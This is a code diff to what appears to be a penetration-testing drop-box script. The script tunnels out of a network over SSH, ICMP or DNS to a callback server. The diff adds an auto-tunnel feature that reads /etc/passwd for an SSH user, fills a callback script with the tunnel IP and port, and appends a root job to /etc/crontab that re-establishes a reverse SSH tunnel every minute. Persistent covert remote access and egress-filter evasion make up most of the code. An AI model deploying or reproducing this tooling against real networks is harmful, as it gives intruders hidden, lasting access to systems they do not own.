@@ -2,6 +2,7 @@
 # By Robin Lennox - twitter.com/robberbear
 
 import argparse
+import shutil
 import sys
 import time
 
@@ -19,6 +20,13 @@ G,Y,B,R,W = colour()
 def check_tools(verbose):
     return gitICMPTunnel(verbose)
 
+def replaceText(filename,origText,replaceText,):
+    s = open(filename).read()
+    s = s.replace(str(origText), str(replaceText))
+    f = open(filename, 'w')
+    f.write(s)
+    f.close()
+
 def parser_error(errmsg):
     banner()
     print "Usage: python "+sys.argv[0]+" [Options] use -h for help"
@@ -35,6 +43,7 @@ def parse_args():
     parser.add_argument('-n', '--nameserver', help='Provide Nameserver for DNS callback',nargs='?', default='')
     parser.add_argument('-p', '--password', help='Password used for DNS callback',nargs='?', default='')
     parser.add_argument('-r', '--recon', help='Enable the recon module',nargs='?', default=False)
+    parser.add_argument('-t', '--tunnel', help='Enable auto tunneling',nargs='?', default=False)
     parser.add_argument('-v', '--verbose', help='Enable Verbosity and display results in realtime',nargs='?', default=False)
     return parser.parse_args()
 
@@ -60,6 +69,21 @@ def args_check():
         print R+"[x] Error an nameserver must be entered for DNS callback to work"+W
         sys.exit(0)
 
+    tunnel = args.tunnel
+    sshuser = ''
+    if tunnel or tunnel is None:
+        passwd=open('/etc/passwd').read()
+        if 'sshuser' in passwd:
+            tunnel = True
+            for line in passwd.splitlines():
+                    if "sshuser" in line:
+                        sshuser=line.split(':')[0]
+                        print sshuser
+        else:
+            print R+"[x] Error: No sshuser!"+W
+            print R+"[x] This needs to be setup for the auto tunnel to work"+W
+            sys.exit(0)
+
     #Check Verbosity
     global verbose
     verbose = args.verbose
@@ -77,6 +101,8 @@ def args_check():
     aggressive = args.aggressive
     if aggressive or aggressive is None:
         aggressive = True
+
+    return aggressive,callbackIP,dnsPassword,nameserver,recon,sshuser,tunnel,verbose
 
 def check_ports():
     global callbackPort
@@ -126,6 +152,7 @@ def callback():
                     if plugin.CallBack.checkTunnel(callbackIP,callbackPort):
                         print G+"[+] SSH is Open"+W
                         successMessage(callbackIP,callbackPort)
+                        return callbackIP,callbackPort
                         status = True
                     else:
                         print R+"\n[x] Port %s open on IP %s but unable to connect via SSH" %(callbackPort,callbackIP,)+W
@@ -153,6 +180,7 @@ def callback():
                         print G+"[+] ICMP Tunnel Created!"+W
                         print B+"[-] An ICMP Tunnel is not as fast as a TCP Tunnel"+W
                         successMessage("10.0.0.1",22)
+                        return "10.0.0.1",'22'
                         status = True
                     else:
                         print R+"[x] ICMP Enabled but unable to create ICMP Tunnel"+W
@@ -173,12 +201,12 @@ def callback():
             #    print G+"[+] DNS Queries are allowed"+W
             if dnsTunnel(dnsPassword,nameserver,verbose,):
                 successMessage('192.168.128.1',22)
+                return '192.168.128.1','22'
                 status = True
             else:
                 print R+"\n[x] Can't attempt DNS Tunnel, DNS is disabled or DNS blocked on the server %s \n" %(nameserver,)+W
                 print R+"\n[x] Try connecting to there Name Server %s \n" %(nameserver,)+W
                 status = False
-      
 
 def startRecon():
     print Y+"\n[*] Running Recon on SMB."+W
@@ -188,7 +216,7 @@ def startRecon():
     print G+"[+] The IP subnet is %s/24" % (subnetIP)
 
 def main():
-    args_check()
+    aggressive,callbackIP,dnsPassword,nameserver,recon,sshuser,tunnel,verbose = args_check()
     banner()
     if not os.geteuid() == 0:
         sys.exit(R+'[!] Script must be run as root\n'+W)
@@ -202,13 +230,38 @@ def main():
     if aggressive:
         print B+"[-] Aggressive is enabled"+W
 
-    quickPortCheck=22
-    if openPort(quickPortCheck,callbackIP) and checkTunnel(callbackIP,quickPortCheck):
+    if tunnel:
+        print B+"[-] Auto Tunnel is enabled"+W
+
+    callbackPort=22
+    tunnelIP=callbackIP
+    tunnelPort=callbackPort
+    if openPort(callbackPort,callbackIP) and checkTunnel(callbackIP,callbackPort):
         # Quick check for 22
-        successMessage(callbackIP,quickPortCheck)
+        successMessage(callbackIP,callbackPort)
     else:
         check_ports()
-        callback()
+
+        # Try incase the nothing returned as there is no possible tunnel
+        try:
+            tunnelIP,tunnelPort=callback()
+        except:
+            print R+'[!] Tunnel not possible, as no posible tunnels to the callback server could be found\n'+W
+            tunnel = False
+            pass
+
+    if tunnel:
+        print G+"[+] Setting up remote tunnel back to this device"+W
+        PWD=os.path.dirname(os.path.realpath(__file__))
+        checkSSHLOC=PWD+'/lib/checkSSH.sh'
+        shutil.copy(PWD+'/lib/checkSSH.bak', checkSSHLOC)
+        replaceText(checkSSHLOC,'SET_IP',tunnelIP)
+        replaceText(checkSSHLOC,'SET_PORT',tunnelPort)
+        replaceText(checkSSHLOC,'SET_USER',sshuser)
+        if checkSSHLOC not in open('/etc/crontab').read():
+            with open('/etc/crontab', "a") as file:
+                print G+"[+] Added SSH to try every minute in /etc/crontab"+W
+                file.write("*/1 * * * * root bash %s > /dev/null 2>&1 \n" %(checkSSHLOC))
     
     if recon:
         startRecon()
